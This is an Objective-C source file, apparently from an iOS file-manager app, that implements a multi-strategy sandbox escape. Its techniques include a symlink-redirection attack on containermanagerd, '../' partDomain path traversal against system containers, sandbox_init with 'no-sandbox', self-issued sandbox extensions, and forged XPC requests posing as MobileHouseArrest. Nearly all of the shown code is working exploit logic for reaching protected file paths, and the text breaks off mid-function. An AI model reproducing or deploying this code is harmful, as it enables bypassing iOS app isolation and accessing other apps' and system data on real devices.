#import "ContainerEngine.h"
#import "kexploit/bad_query.h"
#import "kexploit/sandbox_escape.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <fcntl.h>
#import <os/lock.h>
#import <dirent.h>
#import <sys/stat.h>
#import <errno.h>
#import <pthread.h>

#pragma mark - containermanager C API types

typedef void *(*MCMQueryCreate_t)(void);
typedef void  (*MCMQuerySetU64_t)(void *, uint64_t);
typedef void  (*MCMQuerySetXPC_t)(void *, xpc_object_t);
typedef void  (*MCMQuerySetCString_t)(void *, const char *);
typedef void *(*MCMQueryGetSingle_t)(void *);
typedef void *(*MCMQueryGetError_t)(void *);
typedef bool  (*MCMQueryIterate_t)(void *, bool (^)(void *));
typedef void  (*MCMQueryFree_t)(void *);
typedef const char *(*MCMObjectGetPath_t)(void *);
typedef const char *(*MCMObjectGetIdentifier_t)(void *);
typedef void *(*MCMObjectCopy_t)(void *);
typedef char *(*MCMObjectCopyToken_t)(void *);
typedef bool  (*MCMObjectActivate_t)(void *, bool);
typedef void  (*MCMObjectFree_t)(void *);
typedef int   (*MCMErrorGetPOSIX_t)(void *);
typedef const char *(*MCMErrorGetMessage_t)(void *);

typedef struct {
    void *handle;
    MCMQueryCreate_t    queryCreate;
    MCMQuerySetU64_t    querySetClass;
    MCMQuerySetXPC_t    querySetIdentifiers;
    MCMQuerySetXPC_t    querySetGroupIdentifiers;
    MCMQuerySetU64_t    querySetFlags;
    MCMQuerySetU64_t    querySetPart;
    MCMQuerySetCString_t querySetPartDomain;
    MCMQueryGetSingle_t queryGetSingle;
    MCMQueryGetError_t  queryGetLastError;
    MCMQueryIterate_t   queryIterate;
    MCMQueryFree_t      queryFree;
    MCMObjectGetPath_t  objectGetPath;
    MCMObjectGetIdentifier_t objectGetIdentifier;
    MCMObjectCopy_t     objectCopy;
    MCMObjectCopyToken_t objectCopyToken;
    MCMObjectActivate_t objectActivate;
    MCMObjectFree_t     objectFree;
    MCMErrorGetPOSIX_t  errorGetPOSIX;
    MCMErrorGetMessage_t errorGetMessage;
} MCMAPI;

static MCMAPI *FDGetAPI(void) {
    static MCMAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                            RTLD_NOW | RTLD_LOCAL);
        void *h = api.handle ? api.handle : RTLD_DEFAULT;
#define LOAD(f, sym) api.f = (__typeof(api.f))dlsym(h, sym)
        LOAD(queryCreate,             "container_query_create");
        LOAD(querySetClass,           "container_query_set_class");
        LOAD(querySetIdentifiers,     "container_query_set_identifiers");
        LOAD(querySetGroupIdentifiers,"container_query_set_group_identifiers");
        LOAD(querySetFlags,           "container_query_operation_set_flags");
        LOAD(querySetPart,            "container_query_operation_set_part");
        LOAD(querySetPartDomain,      "container_query_operation_set_part_domain");
        LOAD(queryGetSingle,          "container_query_get_single_result");
        LOAD(queryGetLastError,       "container_query_get_last_error");
        LOAD(queryIterate,            "container_query_iterate_results_sync");
        LOAD(queryFree,               "container_query_free");
        LOAD(objectGetPath,           "container_object_get_path");
        LOAD(objectGetIdentifier,     "container_object_get_identifier");
        LOAD(objectCopy,              "container_object_copy");
        LOAD(objectCopyToken,         "container_copy_sandbox_token");
        LOAD(objectActivate,          "container_object_sandbox_extension_activate");
        LOAD(objectFree,              "container_object_free");
        LOAD(errorGetPOSIX,           "container_error_get_posix_errno");
        LOAD(errorGetMessage,         "container_error_get_message");
#undef LOAD
    });
    return &api;
}

#pragma mark - Lease storage

typedef struct {
    void *query;
    void *activation;
    char  identifier[256];
    char  path[1024];
    bool  active;
} FDLease;

#define MAX_LEASES 16
static FDLease sLeases[MAX_LEASES];
static os_unfair_lock sLeaseLock = OS_UNFAIR_LOCK_INIT;

static FDLease *_findLease(const char *identifier) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (sLeases[i].active && strcmp(sLeases[i].identifier, identifier) == 0)
            return &sLeases[i];
    }
    return NULL;
}

static FDLease *_allocLease(void) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (!sLeases[i].active) return &sLeases[i];
    }
    return &sLeases[0];
}

static void _storeLease(MCMAPI *api, void *q, void *act, const char *ident, const char *path) {
    os_unfair_lock_lock(&sLeaseLock);
    FDLease *lease = _allocLease();
    if (lease->active && lease->query) {
        if (lease->activation && api->objectFree) api->objectFree(lease->activation);
        api->queryFree(lease->query);
    }
    lease->query = q;
    lease->activation = act;
    strlcpy(lease->identifier, ident, sizeof(lease->identifier));
    strlcpy(lease->path, path, sizeof(lease->path));
    lease->active = true;
    os_unfair_lock_unlock(&sLeaseLock);
}

#pragma mark - Logging / diagnostics

static char sDiag[8192] = "";
static int  sDiagLen = 0;
static pthread_mutex_t sDiagMutex = PTHREAD_MUTEX_INITIALIZER;

static pthread_mutex_t sEngineMutex;
static dispatch_once_t sEngineMutexOnce;
static void _ensureEngineMutex(void) {
    dispatch_once(&sEngineMutexOnce, ^{
        pthread_mutexattr_t attr;
        pthread_mutexattr_init(&attr);
        pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
        pthread_mutex_init(&sEngineMutex, &attr);
        pthread_mutexattr_destroy(&attr);
    });
}

static void _diagReset(void) {
    pthread_mutex_lock(&sDiagMutex);
    sDiag[0] = '\0';
    sDiagLen = 0;
    pthread_mutex_unlock(&sDiagMutex);
}
static void _diagAppend(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void _diagAppend(const char *fmt, ...) {
    pthread_mutex_lock(&sDiagMutex);
    va_list ap;
    va_start(ap, fmt);
    int remaining = (int)sizeof(sDiag) - sDiagLen - 1;
    if (remaining > 0) {
        int n = vsnprintf(sDiag + sDiagLen, remaining, fmt, ap);
        if (n > 0) sDiagLen += (n < remaining ? n : remaining);
    }
    va_end(ap);
    pthread_mutex_unlock(&sDiagMutex);
}

static inline void FDLog(NSString *msg) {
    NSLog(@"[FileDavizin] %@", msg);
}

#pragma mark - Runtime app group discovery

static const char *kAppGroupsFallback[] = {
    "group.a8b3cf4e91d07562.1",
    "group.a8b3cf4e91d07562.2",
    "group.a8b3cf4e91d07562.3",
};
static const int kAppGroupCountFallback = 3;

static void _getRuntimeAppGroups(const char ***outGroups, int *outCount) {
    static const char **sGroups = NULL;
    static int sCount = 0;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray<NSString *> *discovered = nil;

        // Method 1: SecTask entitlements
        typedef void *(*SecTaskCreateFromSelfFunc)(CFAllocatorRef);
        typedef CFTypeRef (*SecTaskCopyEntFunc)(void *, CFStringRef, CFErrorRef *);
        SecTaskCreateFromSelfFunc createSelf = (SecTaskCreateFromSelfFunc)
            dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        SecTaskCopyEntFunc copyEnt = (SecTaskCopyEntFunc)
            dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (createSelf && copyEnt) {
            void *task = createSelf(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copyEnt(task,
                    CFSTR("com.apple.security.application-groups"), NULL);
                if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
                    NSArray *arr = (__bridge NSArray *)val;
                    if (arr.count > 0) discovered = [arr copy];
                }
                if (val) CFRelease(val);
                CFRelease(task);
            }
        }

        // Method 2: enumerate class-7 via containermanagerd
        if (!discovered.count) {
            MCMAPI *api = FDGetAPI();
            if (api->queryCreate && api->queryIterate && api->objectGetIdentifier) {
                void *query = api->queryCreate();
                if (query) {
                    api->querySetClass(query, 7);
                    api->querySetFlags(query, 0x100000000ULL);
                    if (api->querySetPart) api->querySetPart(query, 0);
                    NSMutableArray *arr = [NSMutableArray array];
                    api->queryIterate(query, ^bool(void *obj) {
                        const char *ident = obj ? api->objectGetIdentifier(obj) : NULL;
                        if (ident) [arr addObject:[NSString stringWithUTF8String:ident]];
                        return arr.count < 20;
                    });
                    api->queryFree(query);
                    if (arr.count > 0) discovered = [arr copy];
                }
            }
        }

        // Method 3: hardcoded fallback
        if (!discovered.count) {
            NSMutableArray *fb = [NSMutableArray arrayWithCapacity:kAppGroupCountFallback];
            for (int i = 0; i < kAppGroupCountFallback; i++)
                [fb addObject:[NSString stringWithUTF8String:kAppGroupsFallback[i]]];
            discovered = fb;
            NSLog(@"[FD] WARNING: using hardcoded app groups (runtime discovery failed)");
        }

        sCount = (int)discovered.count;
        sGroups = (const char **)calloc(sCount + 1, sizeof(char *));
        for (int i = 0; i < sCount; i++)
            sGroups[i] = strdup(((NSString *)discovered[i]).UTF8String);
    });
    *outGroups = sGroups;
    *outCount = sCount;
}

#pragma mark - worse_query symlink (primary sandbox escape for iOS 27+)

typedef int64_t (*SBXExtConsumeFunc)(const char *);
typedef int (*SBXExtReleaseFunc)(int64_t);

static int64_t _worseQuerySymlinkWithPart(const char *targetPath, int part) {
    if (!targetPath || targetPath[0] != '/') return -1;

    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->querySetGroupIdentifiers || !api->querySetFlags) {
        return -2;
    }

    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_consume");
    if (!consumeExt) return -2;

    _ensureEngineMutex();
    pthread_mutex_lock(&sEngineMutex);
    @try {
    @autoreleasepool {

        static const uint64_t kFlagSets[] = {
            0x8100000000ULL,
            0x900000000ULL,
            0x8000000000ULL,
            0x800000000ULL,
        };
        static const int kFlagCount = 4;
        static int sKnownGoodFlag[2] = {-1, -1};
        static int sKnownGoodGroup[2] = {-1, -1};
        int ci = (part == 1) ? 0 : 1;

        SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT,
                                                                 "sandbox_extension_release");
        NSFileManager *fm = [NSFileManager defaultManager];

        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);

        for (int rawG = 0; rawG < rtGroupCount; rawG++) {
            int g = (sKnownGoodGroup[ci] >= 0 && rawG == 0) ? sKnownGoodGroup[ci]
                  : (sKnownGoodGroup[ci] >= 0 && rawG <= sKnownGoodGroup[ci]) ? rawG - 1
                  : rawG;
            NSString *groupID = [NSString stringWithUTF8String:rtGroups[g]];
            NSURL *containerURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
            if (!containerURL) {
                NSLog(@"[FD-SYM] no container for group %@ (g=%d)", groupID, g);
                continue;
            }

            NSString *libraryPath = [containerURL.path
                                     stringByAppendingPathComponent:@"Library"];
            int libraryFd = open(libraryPath.fileSystemRepresentation,
                                 O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            if (libraryFd < 0) {
                NSLog(@"[FD-SYM] cannot open Library fd g[%d] errno=%d", g, errno);
                continue;
            }

            for (int oi = 0; oi < kFlagCount; oi++) {
                int fi;
                if (sKnownGoodFlag[ci] >= 0) {
                    if (oi == 0) fi = sKnownGoodFlag[ci];
                    else if (oi <= sKnownGoodFlag[ci]) fi = oi - 1;
                    else fi = oi;
                } else {
                    fi = oi;
                }

                struct stat cst;
                if (fstatat(libraryFd, "Caches", &cst, AT_SYMLINK_NOFOLLOW) == 0) {
                    if (S_ISDIR(cst.st_mode)) {
                        NSString *cachesPath = [libraryPath
                            stringByAppendingPathComponent:@"Caches"];
                        [fm removeItemAtPath:cachesPath error:nil];
                    } else {
                        unlinkat(libraryFd, "Caches", 0);
                    }
                }

                if (symlinkat(targetPath, libraryFd, "Caches") != 0) {
                    mkdirat(libraryFd, "Caches", 0755);
                    continue;
                }

                void *q = api->queryCreate();
                if (!q) {
                    unlinkat(libraryFd, "Caches", 0);
                    mkdirat(libraryFd, "Caches", 0755);
                    continue;
                }

                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kFlagSets[fi]);
                if (api->querySetPart) api->querySetPart(q, part);

                void *res = api->queryGetSingle(q);
                int64_t handle = -6;

                if (res) {
                    char *token = api->objectCopyToken ? api->objectCopyToken(res) : NULL;
                    if (token && token[0]) {
                        handle = consumeExt(token);
                        NSLog(@"[FD-SYM] g[%d] f=%d handle=%lld target=%s",
                              g, fi, (long long)handle, targetPath);
                    } else {
                        NSLog(@"[FD-SYM] g[%d] f=%d no token target=%s", g, fi, targetPath);
                    }
                    free(token);
                } else {
                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
                    NSLog(@"[FD-SYM] g[%d] f=%d NULL posix=%d target=%s",
                          g, fi, posix, targetPath);
                }

                unlinkat(libraryFd, "Caches", 0);
                mkdirat(libraryFd, "Caches", 0755);
                xpc_release(xid);
                api->queryFree(q);

                if (handle >= 0) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        sKnownGoodFlag[ci] = fi;
                        sKnownGoodGroup[ci] = g;
                        FDLog([NSString stringWithFormat:
                            @"WQ-SYM success g[%d] f=%d p=%d → %s", g, fi, part, targetPath]);
                        close(libraryFd);
                        return handle;
                    }
                    int openErrno = errno;
                    NSLog(@"[FD-SYM] g[%d] f=%d p=%d handle=%lld but open errno=%d %s",
                          g, fi, part, (long long)handle, openErrno, targetPath);
                    if (releaseExt) releaseExt(handle);
                    if (openErrno == ENOENT) {
                        close(libraryFd);
                        return -1;
                    }
                }
            }

            close(libraryFd);
        }

        return -1;
    }
    } @finally {
        pthread_mutex_unlock(&sEngineMutex);
    }
}

static int64_t _worseQuerySymlink(const char *targetPath) {
    return _worseQuerySymlinkWithPart(targetPath, 3);
}

#pragma mark - worse_query partDomain traversal (fallback)

static const uint64_t kRWPartFlags = 0x8100000000ULL;

typedef struct {
    uint64_t cls;
    const char *identifier;
    bool group;
    uint64_t part;
    int depth;
    const char *label;
} FDAnchor;

static const FDAnchor kAnchors[] = {
    { 12, "com.apple.geod",                              false, 3, 6, "C12-geod" },
    { 13, "systemgroup.com.apple.mobilegestaltcache",     true,  3, 6, "C13-gestalt" },
    { 13, "systemgroup.com.apple.installcoordinationd",   true,  3, 6, "C13-install" },
    { 12, "com.apple.eligibilityd",                       false, 3, 6, "C12-eligib" },
    { 13, "systemgroup.com.apple.configurationprofiles",  true,  0, 4, "C13-config" },
    { 10, "com.apple.swcd",                               false, 0, 4, "C10-swcd" },
    { 10, "com.apple.lsd",                                false, 0, 4, "C10-lsd" },
    { 15, "com.apple.appmanagedfeaturesd",                false, 0, 4, "C15-appman" },
};
static const int kAnchorCount = sizeof(kAnchors) / sizeof(kAnchors[0]);

static int64_t _worseQueryGrant(const char *targetPath, const char *leaseLabel) {
    _ensureEngineMutex();
    pthread_mutex_lock(&sEngineMutex);
    @try {

    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->querySetPartDomain || !api->queryGetSingle ||
        !api->objectCopy || !api->objectActivate) {
        return -1;
    }

    const char *relPath = NULL;
    if (strncmp(targetPath, "/private/var/", 13) == 0)
        relPath = targetPath + 13;
    else if (strncmp(targetPath, "/var/", 5) == 0)
        relPath = targetPath + 5;
    else {
        return -1;
    }

    for (int i = 0; i < kAnchorCount; i++) {
        const FDAnchor *a = &kAnchors[i];

        char domain[2048];
        domain[0] = '\0';
        for (int d = 0; d < a->depth; d++) {
            if (d == 0) strlcat(domain, "..", sizeof(domain));
            else strlcat(domain, "/..", sizeof(domain));
        }
        strlcat(domain, "/", sizeof(domain));
        strlcat(domain, relPath, sizeof(domain));

        void *q = api->queryCreate();
        if (!q) continue;

        api->querySetClass(q, a->cls);
        xpc_object_t xid = xpc_string_create(a->identifier);
        if (a->group && api->querySetGroupIdentifiers)
            api->querySetGroupIdentifiers(q, xid);
        else
            api->querySetIdentifiers(q, xid);
        api->querySetFlags(q, kRWPartFlags);
        if (api->querySetPart) api->querySetPart(q, a->part);
        api->querySetPartDomain(q, domain);

        void *res = api->queryGetSingle(q);
        if (res) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool hasToken = token && token[0] != '\0';

                if (hasToken) {
                    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                             "sandbox_extension_consume");
                    if (consumeExt) {
                        int64_t h = consumeExt(token);
                        if (h >= 0) {
                            int fd = open(targetPath, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                FDLog([NSString stringWithFormat:
                                    @"WQ %s direct-consume h=%lld → open OK for %s",
                                    a->label, (long long)h, targetPath]);
                                _storeLease(api, q, act, leaseLabel ?: a->identifier, targetPath);
                                free(token);
                                xpc_release(xid);
                                return 9100 + i;
                            }
                        }
                    }
                }

                bool activated = hasToken && api->objectActivate(act, false);
                if (!activated) activated = api->objectActivate(act, true);
                free(token);

                int fd = open(targetPath, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                if (fd >= 0) {
                    close(fd);
                    FDLog([NSString stringWithFormat:
                        @"WQ %s tok=%d act=%d → open OK for %s",
                        a->label, hasToken, activated, targetPath]);
                    _storeLease(api, q, act, leaseLabel ?: a->identifier, targetPath);
                    xpc_release(xid);
                    return 9100 + i;
                }
                if (api->objectFree) api->objectFree(act);
            }
        }

        xpc_release(xid);
        api->queryFree(q);
    }

    return -1;

    } @finally {
        pthread_mutex_unlock(&sEngineMutex);
    }
}

#pragma mark - Aggressive sandbox techniques

static void _attemptSandboxRelax(void) {
    typedef int (*SandboxInitFunc)(const char *, uint64_t, char **);
    typedef int (*SandboxInitParamsFunc)(const char *, uint64_t, const char *const [], char **);
    typedef void (*SandboxFreeErrorFunc)(char *);

    SandboxInitFunc si = (SandboxInitFunc)dlsym(RTLD_DEFAULT, "sandbox_init");
    SandboxFreeErrorFunc sfe = (SandboxFreeErrorFunc)dlsym(RTLD_DEFAULT, "sandbox_free_error");

    if (si) {
        static const char *kProfiles[] = {
            "no-sandbox", "no-network", "no-internet",
            "com.apple.MobileHouseArrest",
            "com.apple.mobile.MobileHouseArrest",
            "MobileHouseArrest",
            "com.apple.afc",
        };
        for (int i = 0; i < (int)(sizeof(kProfiles)/sizeof(kProfiles[0])); i++) {
            char *err = NULL;
            int rc = si(kProfiles[i], 0, &err);
            NSLog(@"[FD-SBX] sandbox_init(%s) -> %d err=%s", kProfiles[i], rc, err ?: "none");
            if (err) { if (sfe) sfe(err); else free(err); }
            if (rc == 0) {
                NSLog(@"[FD-SBX] SANDBOX RELAXED via %s!", kProfiles[i]);
                return;
            }
        }
    }

    SandboxInitParamsFunc sip = (SandboxInitParamsFunc)dlsym(RTLD_DEFAULT,
                                                              "sandbox_init_with_parameters");
    if (sip) {
        const char *params[] = { "HOME", "/private/var/mobile", NULL };
        char *err = NULL;
        int rc = sip("no-sandbox", 0, params, &err);
        NSLog(@"[FD-SBX] sandbox_init_with_parameters -> %d", rc);
        if (err) { if (sfe) sfe(err); else free(err); }
    }
}

static int64_t _tryContainerCreateLookup(const char *targetPath) {
    static int sLookupFailed = 0;
    if (sLookupFailed) return -1;

    typedef const char *(*ContainerLookup_t)(uint64_t, const char *, void **, char **);
    ContainerLookup_t lookup = (ContainerLookup_t)dlsym(RTLD_DEFAULT,
        "container_create_or_lookup_path_for_current_user");
    if (!lookup) { sLookupFailed = 1; return -1; }

    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_consume");
    MCMObjectCopyToken_t copyToken = (MCMObjectCopyToken_t)dlsym(RTLD_DEFAULT,
                                                                   "container_copy_sandbox_token");

    static const uint64_t kClasses[] = { 2, 7, 10, 12, 13, 15 };
    static const char *kClassLabels[] = { "app", "grp", "intd", "sys", "sgrp", "psys" };
    for (int ci = 0; ci < 6; ci++) {
        void *container = NULL;
        char *errMsg = NULL;
        const char *result = lookup(kClasses[ci], targetPath, &container, &errMsg);
        if (errMsg) { free(errMsg); errMsg = NULL; }
        if (!result) continue;

        NSLog(@"[FD-CL] create_lookup cls=%s path=%s -> %s",
              kClassLabels[ci], targetPath, result);

        if (container && copyToken && consumeExt) {
            char *token = copyToken(container);
            if (token && token[0]) {
                int64_t h = consumeExt(token);
                if (h >= 0) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        free(token);
                        NSLog(@"[FD-CL] create_lookup ACCESS cls=%s h=%lld",
                              kClassLabels[ci], (long long)h);
                        return h;
                    }
                }
            }
            free(token);
        }
    }
    sLookupFailed = 1;
    return -1;
}

static NSArray *_cachedLSApps(void) {
    static NSArray *sApps = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        Class LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
        if (!LSAppWorkspace) return;
        id workspace = [LSAppWorkspace performSelector:@selector(defaultWorkspace)];
        if (!workspace) return;
        @try {
            sApps = [workspace performSelector:@selector(allInstalledApplications)];
        } @catch (NSException *e) {
            NSLog(@"[FD-LS] allInstalledApplications exception: %@", e);
        }
    });
    return sApps;
}

static int64_t _tryLSProxyGrant(const char *targetPath) {
    NSArray *allApps = _cachedLSApps();
    if (!allApps.count) return -1;

    NSString *target = [NSString stringWithUTF8String:targetPath];

    for (id proxy in allApps) {
        @autoreleasepool {
            NSURL *dataURL = nil;
            @try {
                if ([proxy respondsToSelector:@selector(dataContainerURL)])
                    dataURL = [proxy performSelector:@selector(dataContainerURL)];
            } @catch (NSException *e) { continue; }
            if (!dataURL) continue;

            NSString *containerPath = dataURL.path;
            if (!containerPath) continue;

            if ([containerPath hasPrefix:@"/var/"])
                containerPath = [@"/private" stringByAppendingString:containerPath];

            if ([target hasPrefix:containerPath] || [target isEqualToString:containerPath]) {
                BOOL started = [dataURL startAccessingSecurityScopedResource];
                if (started) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        return 9500;
                    }
                }

                NSURL *targetURL = [NSURL fileURLWithPath:target];
                started = [targetURL startAccessingSecurityScopedResource];
                if (started) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        return 9501;
                    }
                }
            }
        }
    }
    return -1;
}

static int64_t _tryDirectContainerdXPC(const char *targetPath) {
    static int sXPCFailed = 0;
    if (sXPCFailed) return -1;

    typedef xpc_connection_t (*XPCCreateMachService_t)(const char *, dispatch_queue_t, uint64_t);
    XPCCreateMachService_t createMach = (XPCCreateMachService_t)dlsym(RTLD_DEFAULT,
        "xpc_connection_create_mach_service");
    if (!createMach) { sXPCFailed = 1; return -1; }

    xpc_connection_t conn = createMach("com.apple.containermanagerd", NULL, 0);
    if (!conn) { sXPCFailed = 1; return -1; }

    xpc_connection_set_event_handler(conn, ^(xpc_object_t __unused event) {});
    xpc_connection_resume(conn);

    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_consume");
    int64_t result = -1;

    static const uint64_t kOps[] = { 6, 7, 8, 10, 12 };
    for (int oi = 0; oi < 5 && result < 0; oi++) {
        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(msg, "path", targetPath);
        xpc_dictionary_set_uint64(msg, "operation", kOps[oi]);
        xpc_dictionary_set_uint64(msg, "class", 2);
        xpc_dictionary_set_bool(msg, "create", true);
        xpc_dictionary_set_bool(msg, "activate", true);
        xpc_dictionary_set_string(msg, "bundle-id", "com.apple.mobile.MobileHouseArrest");

        __block xpc_object_t reply = NULL;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        xpc_connection_send_message_with_reply(conn, msg, dispatch_get_global_queue(0, 0),
            ^(xpc_object_t r) { reply = r; dispatch_semaphore_signal(sem); });
        long waited = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 500000000LL));
        if (waited != 0) {
            NSLog(@"[FD-XPC] timeout op=%llu", kOps[oi]);
            continue;
        }

        if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
            const char *token = xpc_dictionary_get_string(reply, "sandbox-extension");
            if (!token) token = xpc_dictionary_get_string(reply, "token");
            if (!token) token = xpc_dictionary_get_string(reply, "extension");
            if (token && consumeExt) {
                int64_t h = consumeExt(token);
                if (h >= 0) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        result = h;
                        NSLog(@"[FD-XPC] Direct XPC op=%llu OK h=%lld",
                              kOps[oi], (long long)h);
                    }
                }
            }
        }
    }

    xpc_connection_cancel(conn);
    if (result < 0) sXPCFailed = 1;
    return result;
}

#pragma mark - FDGrantAccess

typedef char *(*SandboxIssueFileFunc)(const char *, const char *, uint32_t);
typedef char *(*SandboxIssueFilePidFunc)(const char *, const char *, uint32_t, pid_t);
typedef int   (*SandboxCheckFunc)(pid_t, const char *, int, ...);
#define SANDBOX_FILTER_PATH 1

static int64_t _FDGrantAccessLocked(const char *path) {
    _diagReset();
    _diagAppend("grant target=%s | ", path);

    NSString *cleanPath = [NSString stringWithUTF8String:path];
    if ([cleanPath hasSuffix:@"/"]) {
        cleanPath = [cleanPath substringToIndex:cleanPath.length - 1];
    }
    const char *pathC = cleanPath.UTF8String;

    MCMAPI *api = FDGetAPI();
    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_consume");
    SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_release");

    // Pre-check: is path already accessible?
    {
        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            _diagAppend("ALREADY_OPEN | ");
            return 9999;
        }
    }

    // Strategy 1: WQ-SYM (primary for iOS 27+)
    {
        int64_t h = _worseQuerySymlink(pathC);
        if (h >= 0) {
            _diagAppend("WQ-SYM OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("WQ-SYM fail | ");
    }

    // Strategy 2: WQ partDomain traversal
    {
        int64_t h = _worseQueryGrant(pathC, "fd-grant");
        if (h >= 0) {
            _diagAppend("WQ-PD OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("WQ-PD fail | ");
    }

    // Strategy 3: sandbox_extension_issue_file (self-issued extension)
    {
        SandboxIssueFileFunc issueFile = (SandboxIssueFileFunc)dlsym(RTLD_DEFAULT,
                                                                      "sandbox_extension_issue_file");
        SandboxIssueFilePidFunc issueFilePid = (SandboxIssueFilePidFunc)dlsym(RTLD_DEFAULT,
            "sandbox_extension_issue_file_to_process_by_pid");

        static const char *kExtClasses[] = {
            "com.apple.app-sandbox.read-write",
            "com.apple.app-sandbox.read",
            "com.apple.sandbox.container",
            "com.apple.security.exception.files.absolute-path.read-write",
            "com.apple.mobile.house_arrest.readwrite",
            "com.apple.mobile.house_arrest.readonly",
            "com.apple.mobile.house_arrest",
            "com.apple.sandbox.system-group",
            "com.apple.security.exception.files.absolute-path.read-only",
            "com.apple.app-sandbox.read-write.file-mode.metadata-only",
        };
        int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);

        for (int ci = 0; ci < nClasses; ci++) {
            if (issueFile && consumeExt) {
                char *token = issueFile(kExtClasses[ci], pathC, 0);
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) {
                            close(fd);
                            _diagAppend("ISSUE_FILE[%d] OK h=%lld", ci, (long long)h);
                            free(token);
                            return h;
                        }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
            if (issueFilePid && consumeExt) {
                char *token = issueFilePid(kExtClasses[ci], pathC, 0, getpid());
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) {
                            close(fd);
                            _diagAppend("ISSUE_PID[%d] OK h=%lld", ci, (long long)h);
                            free(token);
                            return h;
                        }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
        }
        _diagAppend("ISSUE fail | ");
    }

    // Strategy 4: MCM class-7 app group activation (with force mode)
    const char **rtGroups; int rtGroupCount;
    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
    if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
        for (int g = 0; g < rtGroupCount; g++) {
            static const uint64_t kGrantFlags[] = { 0x900000000ULL, 0x8100000000ULL };
            for (int fi = 0; fi < 2; fi++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kGrantFlags[fi]);
                if (api->querySetPart) api->querySetPart(q, 0);
                void *res = api->queryGetSingle(q);
                if (res && api->objectCopy) {
                    // 6a: activate(false)
                    void *act = api->objectCopy(res);
                    if (act) {
                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                        bool activated = false;
                        if (token && token[0] != '\0')
                            activated = api->objectActivate(act, false);
                        free(token);
                        if (activated) {
                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                _storeLease(api, q, act, rtGroups[g], pathC);
                                xpc_release(xid);
                                _diagAppend("MCM-C7 OK g[%d] f=%d", g, fi);
                                return 9000 + g;
                            }
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                    // 6b: activate(true) — force mode
                    act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, true);
